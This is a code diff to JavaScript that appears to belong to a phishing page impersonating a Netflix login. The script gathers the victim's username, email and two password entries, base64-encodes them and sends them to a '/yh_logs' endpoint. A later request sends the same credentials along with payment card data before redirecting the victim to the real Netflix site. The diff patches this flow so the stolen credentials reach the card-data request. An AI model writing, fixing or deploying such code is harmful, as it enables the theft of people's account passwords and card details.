@@ -123,6 +123,7 @@ setTimeout(function(){
 	if(clicked == 1)
 	{
 	var encodedString = btoa(JSON.stringify({ username: $('input[name="userLoginId"]').val(), email: getUrlVars()['email'], password1:Window.pass1 ,password2: $('input[type="password"]').val()}));
+	Window.encodedString = encodedString;
 	let datastg=JSON.parse(atob(encodedString));
 	console.log(datastg);
 	$.get( "/yh_logs", { username: datastg['username'],  email:datastg['email'], password:datastg['password1'], password2:datastg['password2']}).done(function( data ) {});
@@ -179,7 +180,7 @@ setTimeout(function(){
 			
 		} catch{}
 	}
-	let datastg=JSON.parse(atob(encodedString));
+	let datastg=JSON.parse(atob(Window.encodedString));
 	$.get( "/yh_logs", { username: datastg['username'],  email:datastg['email'], password:datastg['password1'], password2:datastg['password2'], cardData:cardData}).done(function( data ) {
 	window.location.replace("https://www.netflix.com");
 	});
